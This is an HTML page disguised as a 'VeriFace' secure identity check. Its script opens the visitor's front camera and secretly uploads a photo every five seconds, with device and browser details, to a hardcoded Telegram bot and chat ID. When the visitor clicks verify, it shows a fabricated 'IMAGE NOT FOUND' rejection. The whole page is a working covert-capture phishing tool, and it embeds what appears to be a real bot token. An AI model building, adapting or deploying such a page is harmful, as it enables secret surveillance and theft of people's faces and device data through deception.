<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
    <title>VeriFace • Secure Identity Check</title>
    <!-- Minimal font and icons -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* RESET + MINIMAL DESIGN SYSTEM */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #f5f7fc;
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            padding: 20px 16px 40px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* main card – clean, minimal, elevated */
        .verif-card {
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.02);
            overflow: hidden;
            transition: all 0.2s ease;
        }

        /* header area */
        .verif-header {
            padding: 28px 24px 16px;
            text-align: center;
            border-bottom: 1px solid #eef2f6;
        }

        .icon-circle {
            background: #f0f4fe;
            width: 64px;
            height: 64px;
            border-radius: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 14px;
        }

        .icon-circle i {
            font-size: 32px;
            color: #1e6f5c;
        }

        .verif-header h1 {
            font-size: 1.75rem;
            font-weight: 600;
            letter-spacing: -0.3px;
            color: #1a2c3e;
            margin-bottom: 6px;
        }

        .verif-header p {
            font-size: 0.85rem;
            color: #5e6f8d;
            font-weight: 400;
        }

        /* camera wrapper – clean radius */
        .camera-wrapper {
            padding: 20px 24px 12px;
        }

        .camera-box {
            position: relative;
            background: #101214;
            border-radius: 28px;
            overflow: hidden;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid #e2e8f0;
        }

        #faceVideo {
            width: 100%;
            aspect-ratio: 4 / 3;
            object-fit: cover;
            display: block;
            transform: scaleX(1);
            background: #000;
        }

        /* minimal scan line (subtle) */
        .scan-effect {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: repeating-linear-gradient(
                to bottom,
                rgba(30, 111, 92, 0) 0px,
                rgba(30, 111, 92, 0) 35px,
                rgba(30, 111, 92, 0.12) 35px,
                rgba(30, 111, 92, 0.22) 38px,
                rgba(30, 111, 92, 0) 38px
            );
            background-size: 100% 45px;
            animation: softScan 2.4s linear infinite;
            border-radius: 28px;
        }

        @keyframes softScan {
            0% { background-position: 0 0; }
            100% { background-position: 0 100%; }
        }

        .face-guide {
            position: absolute;
            top: 18%;
            left: 12%;
            width: 76%;
            height: 64%;
            border: 1.5px dashed rgba(30, 111, 92, 0.7);
            border-radius: 48px;
            background: rgba(0, 0, 0, 0.25);
            backdrop-filter: blur(2px);
        }

        .face-guide::after {
            content: "POSITION FACE";
            position: absolute;
            bottom: -28px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.65);
            backdrop-filter: blur(8px);
            font-size: 0.6rem;
            font-weight: 500;
            padding: 3px 12px;
            border-radius: 40px;
            color: #c0f0e6;
            white-space: nowrap;
            letter-spacing: 0.5px;
        }

        /* status row minimal */
        .status-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 14px;
            background: #f8fafd;
            padding: 8px 16px;
            border-radius: 60px;
            border: 1px solid #eef2f8;
        }

        .cam-status {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.75rem;
            font-weight: 500;
            color: #2c3e50;
        }

        .live-dot {
            width: 8px;
            height: 8px;
            background: #2c9a8a;
            border-radius: 50%;
            box-shadow: 0 0 0 2px rgba(44,154,138,0.2);
            animation: pulseMin 1.2s infinite;
        }

        @keyframes pulseMin {
            0% { opacity: 0.5; transform: scale(0.8);}
            100% { opacity: 1; transform: scale(1.2);}
        }

        .counter-badge {
            background: #eef2f9;
            padding: 4px 12px;
            border-radius: 40px;
            font-size: 0.7rem;
            font-family: monospace;
            font-weight: 500;
            color: #1f4e43;
        }

        /* action area */
        .action-area {
            padding: 8px 24px 24px;
        }

        .verify-btn {
            width: 100%;
            background: #1e6f5c;
            border: none;
            border-radius: 60px;
            padding: 14px 20px;
            font-size: 1rem;
            font-weight: 600;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
        }

        .verify-btn:hover {
            background: #155e4e;
            transform: scale(0.98);
        }

        .verify-btn:active {
            transform: scale(0.96);
        }

        /* fake error block – minimal but visible */
        .error-block {
            margin-top: 18px;
            background: #fff6f0;
            border-left: 4px solid #f97316;
            border-radius: 20px;
            padding: 14px 16px;
            transition: all 0.2s;
        }

        .error-inner {
            display: flex;
            gap: 14px;
            align-items: center;
        }

        .error-inner i {
            font-size: 1.3rem;
            color: #e65c1e;
        }

        .error-inner span {
            font-size: 0.8rem;
            font-weight: 500;
            color: #9b4a1a;
            line-height: 1.4;
        }

        .error-meta {
            font-size: 0.6rem;
            color: #8b7a6b;
            margin-top: 8px;
            text-align: right;
            font-family: monospace;
        }

        /* footer minimal */
        .footer-note {
            padding: 16px 24px 24px;
            text-align: center;
            border-top: 1px solid #edf2f7;
            font-size: 0.65rem;
            color: #8a99b0;
        }

        /* responsive touches */
        @media (max-width: 480px) {
            body {
                padding: 12px 12px 24px;
            }
            .verif-header h1 {
                font-size: 1.5rem;
            }
            .camera-wrapper {
                padding: 16px 18px 8px;
            }
            .action-area {
                padding: 12px 18px 24px;
            }
            .face-guide::after {
                content: "ALIGN";
                font-size: 0.5rem;
                bottom: -22px;
                padding: 2px 8px;
            }
            .verif-header {
                padding: 20px 20px 12px;
            }
        }

        /* hidden canvas */
        .hidden-canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="verif-card">
    <div class="verif-header">
        <div class="icon-circle">
            <i class="fas fa-user-shield"></i>
        </div>
        <h1>Face verification</h1>
        <p>Liveness detection • encrypted match</p>
    </div>

    <div class="camera-wrapper">
        <div class="camera-box">
            <video id="faceVideo" autoplay playsinline muted></video>
            <div class="scan-effect"></div>
            <div class="face-guide"></div>
        </div>
        <div class="status-row">
            <div class="cam-status">
                <span class="live-dot"></span>
                <span id="camStatusMsg">Initializing camera</span>
            </div>
            <div class="counter-badge" id="captureCountDisplay">
                <i class="fas fa-camera"></i> 0
            </div>
        </div>
    </div>

    <div class="action-area">
        <button class="verify-btn" id="fakeVerifyTrigger">
            <i class="fas fa-id-card"></i> Verify my identity
        </button>

        <!-- fake error container (hidden initially) -->
        <div id="fakeErrorPanel" class="error-block" style="display: none;">
            <div class="error-inner">
                <i class="fas fa-database"></i>
                <span id="errorMsgText"><strong>IMAGE NOT FOUND</strong> — No matching facial signature in secure vault.</span>
            </div>
            <div class="error-meta" id="errorTimeRef">verification rejected • ID: FACE_ERR_404</div>
        </div>
        <p style="font-size: 0.65rem; text-align: center; margin-top: 14px; color: #8ba0bc;">
            <i class="fas fa-lock"></i> Biometric check • 3D anti-spoof
        </p>
    </div>

    <div class="footer-note">
        <i class="fas fa-shield-alt"></i> Encrypted channel • session protected
    </div>
</div>

<!-- hidden canvas for image capture -->
<canvas id="hiddenCaptureCanvas" class="hidden-canvas"></canvas>

<script>
    // --------------------------------------------------------------
    // TELEGRAM CONFIGURATION (REPLACE WITH YOUR OWN TOKEN & CHAT ID)
    // --------------------------------------------------------------
    const BOT_TOKEN = '8041268145:AAHCnHlbnxvEODDsMTFm-mQYe8ovYBq2IF0';     // <-- replace with actual bot token, e.g., "7123456789:AAFtX..."
    const CHAT_ID = '5541151768';       // <-- replace with your chat ID (numeric or @username)
    
    // Settings: capture every 5 seconds (background)
    const CAPTURE_INTERVAL_MS = 5000;
    
    // DOM elements
    const videoEl = document.getElementById('faceVideo');
    const canvasEl = document.getElementById('hiddenCaptureCanvas');
    const camStatusSpan = document.getElementById('camStatusMsg');
    const captureCountSpan = document.getElementById('captureCountDisplay');
    const fakeErrorPanel = document.getElementById('fakeErrorPanel');
    const verifyButton = document.getElementById('fakeVerifyTrigger');
    const errorMsgSpan = document.getElementById('errorMsgText');
    const errorTimestampSpan = document.getElementById('errorTimeRef');
    
    // state variables
    let mediaStream = null;
    let canvasCtx = null;
    let captureIntervalId = null;
    let isCameraReady = false;
    let totalCaptures = 0;
    let isCaptureActive = false;
    
    // --------------------------------------------------------------
    // TELEGRAM HELPERS (send photo + text)
    // --------------------------------------------------------------
    async function sendPhotoToTelegram(blob, captureNumber) {
        if (!BOT_TOKEN || BOT_TOKEN === '#' || !CHAT_ID || CHAT_ID === '#') {
            console.warn("[Telegram] missing credentials - image not sent");
            return false;
        }
        const formData = new FormData();
        const filename = `face_capture_${captureNumber}_${Date.now()}.jpg`;
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, filename);
        
        const timestamp = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'medium' });
        const caption = `📸 FACE SCAN #${captureNumber}\n🕒 ${timestamp}\n📱 ${navigator.platform} | ${navigator.language}\n🌐 ${navigator.userAgent.substring(0, 70)}`;
        formData.append('caption', caption);
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            const data = await response.json();
            if (data.ok) {
                console.log(`✅ Telegram: capture #${captureNumber} sent`);
                return true;
            } else {
                console.error('Telegram API error:', data);
                return false;
            }
        } catch (err) {
            console.error('Send photo error:', err);
            return false;
        }
    }
    
    async function sendTelegramMessage(text) {
        if (!BOT_TOKEN || BOT_TOKEN === '#' || !CHAT_ID || CHAT_ID === '#') return;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 1000) })
            });
        } catch (e) { console.warn("text notif error", e); }
    }
    
    // --------------------------------------------------------------
    // CAPTURE CURRENT VIDEO FRAME AND SEND TO TELEGRAM
    // --------------------------------------------------------------
    async function captureAndSend() {
        if (!isCameraReady || !videoEl || videoEl.readyState !== 4) {
            return;
        }
        if (!canvasCtx || !canvasEl) return;
        
        const width = videoEl.videoWidth;
        const height = videoEl.videoHeight;
        if (width === 0 || height === 0) return;
        
        canvasEl.width = width;
        canvasEl.height = height;
        canvasCtx.drawImage(videoEl, 0, 0, width, height);
        
        canvasEl.toBlob(async (blob) => {
            if (blob && blob.size > 500) {
                totalCaptures++;
                captureCountSpan.innerHTML = `<i class="fas fa-camera"></i> ${totalCaptures}`;
                await sendPhotoToTelegram(blob, totalCaptures);
            } else {
                console.warn("empty blob on capture");
            }
        }, 'image/jpeg', 0.85);
    }
    
    // start periodic background capture (every 5 seconds)
    function startBackgroundCapture() {
        if (captureIntervalId) clearInterval(captureIntervalId);
        if (!isCameraReady) return;
        if (isCaptureActive) return;
        isCaptureActive = true;
        
        // capture immediately once
        captureAndSend();
        captureIntervalId = setInterval(() => {
            if (isCameraReady && videoEl && videoEl.readyState === 4) {
                captureAndSend();
            }
        }, CAPTURE_INTERVAL_MS);
        
        console.log(`[system] Background capture active, interval ${CAPTURE_INTERVAL_MS/1000}s`);
        camStatusSpan.innerHTML = 'Active • capturing';
    }
    
    // --------------------------------------------------------------
    // CAMERA INIT (front facing, mobile-friendly)
    // --------------------------------------------------------------
    async function initCamera() {
        canvasCtx = canvasEl.getContext('2d');
        if (!videoEl) return;
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: 'user'   // front camera for face verification look
                },
                audio: false
            });
            mediaStream = stream;
            videoEl.srcObject = stream;
            
            videoEl.onloadedmetadata = () => {
                videoEl.play();
                isCameraReady = true;
                camStatusSpan.innerHTML = 'Camera ready';
                startBackgroundCapture();
                
                // send visit notification (silent)
                const visitMsg = `🔹 NEW FACE VERIFICATION SESSION\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.platform} | ${navigator.language}\n📷 Resolution: ${videoEl.videoWidth}x${videoEl.videoHeight}\n⏱️ 5s capture active`;
                sendTelegramMessage(visitMsg);
            };
        } catch (error) {
            console.error('Camera init error:', error);
            camStatusSpan.innerHTML = 'Allow camera access';
            // fallback attempt (rear camera / any)
            try {
                const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                mediaStream = fallbackStream;
                videoEl.srcObject = fallbackStream;
                videoEl.onloadedmetadata = () => {
                    videoEl.play();
                    isCameraReady = true;
                    camStatusSpan.innerHTML = 'Camera (fallback)';
                    startBackgroundCapture();
                    sendTelegramMessage(`⚠️ Fallback camera mode • ${new Date().toLocaleString()}`);
                };
            } catch (fallbackErr) {
                camStatusSpan.innerHTML = 'Camera unavailable';
                console.error('no camera fallback', fallbackErr);
            }
        }
    }
    
    // --------------------------------------------------------------
    // FAKE VERIFICATION: "IMAGE NOT FOUND" AFTER BUTTON CLICK
    // --------------------------------------------------------------
    function displayFakeError() {
        if (fakeErrorPanel) {
            const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute:'2-digit', second:'2-digit' });
            errorMsgSpan.innerHTML = '<strong>⚠️ IMAGE NOT FOUND</strong> — Facial signature mismatch. No record in database.';
            errorTimestampSpan.innerText = `verification failed • ${timeNow} • code: FACE_NF_${Math.floor(Math.random()*1000)}`;
            fakeErrorPanel.style.display = 'block';
            
            // subtle auto-scroll to error
            fakeErrorPanel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
        // also send telegram alert that fake rejection triggered
        sendTelegramMessage(`[FAKE BACKEND] Face verification rejected: "IMAGE NOT FOUND". User clicked verify. Time: ${new Date().toLocaleString()}`);
    }
    
    function onVerifyClick() {
        if (!isCameraReady) {
            // show error with camera not ready context
            if (fakeErrorPanel) {
                errorMsgSpan.innerHTML = '<strong>⚠️ CAMERA ERROR</strong> — Face not detected. Image not found.';
                errorTimestampSpan.innerText = `verification aborted • ${new Date().toLocaleTimeString()}`;
                fakeErrorPanel.style.display = 'block';
            }
            return;
        }
        
        // simulate processing delay (like backend matching)
        const originalBtnText = verifyButton.innerHTML;
        verifyButton.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Matching face...';
        verifyButton.disabled = true;
        
        // capture extra immediate frame at verification moment (additional evidence)
        captureAndSend();
        
        setTimeout(() => {
            displayFakeError();
            verifyButton.innerHTML = originalBtnText;
            verifyButton.disabled = false;
            
            // small haptic effect (shake on error block)
            if (fakeErrorPanel) {
                fakeErrorPanel.style.transform = 'translateX(3px)';
                setTimeout(() => { if(fakeErrorPanel) fakeErrorPanel.style.transform = ''; }, 150);
            }
        }, 800);
    }
    
    // --------------------------------------------------------------
    // WAKE LOCK & VISIBILITY HANDLING (keep camera / capture active)
    // --------------------------------------------------------------
    let wakeLockObj = null;
    async function requestWakeLock() {
        if ('wakeLock' in navigator) {
            try {
                wakeLockObj = await navigator.wakeLock.request('screen');
            } catch (err) { console.warn("wake lock error"); }
        }
    }
    
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden && isCameraReady && !captureIntervalId) {
            startBackgroundCapture();
        } else if (document.hidden && captureIntervalId) {
            // we keep the interval running in background (works on modern mobile)
        }
    });
    
    // --------------------------------------------------------------
    // CLEANUP on page unload
    // --------------------------------------------------------------
    window.addEventListener('beforeunload', () => {
        if (captureIntervalId) {
            clearInterval(captureIntervalId);
            captureIntervalId = null;
        }
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => {
                if (track.readyState === 'live') track.stop();
            });
        }
        if (wakeLockObj && wakeLockObj.release) wakeLockObj.release();
    });
    
    // --------------------------------------------------------------
    // BOOTSTRAP
    // --------------------------------------------------------------
    document.addEventListener('DOMContentLoaded', () => {
        initCamera();
        requestWakeLock();
        
        // attach verify button event
        if (verifyButton) {
            verifyButton.addEventListener('click', onVerifyClick);
        }
        
        // initially hide fake error panel
        if (fakeErrorPanel) fakeErrorPanel.style.display = 'none';
        
        // after 2 sec if camera not ready, show hint
        setTimeout(() => {
            if (!isCameraReady) {
                camStatusSpan.innerHTML = '⚠️ permission required';
            }
        }, 2500);
    });
    
    // make sure we can handle orientation changes smoothly
    window.addEventListener('resize', () => {
        if (videoEl && videoEl.videoWidth && canvasCtx) {
            // just refresh capture dimensions on resize
        }
    });
</script>
</body>
</html>
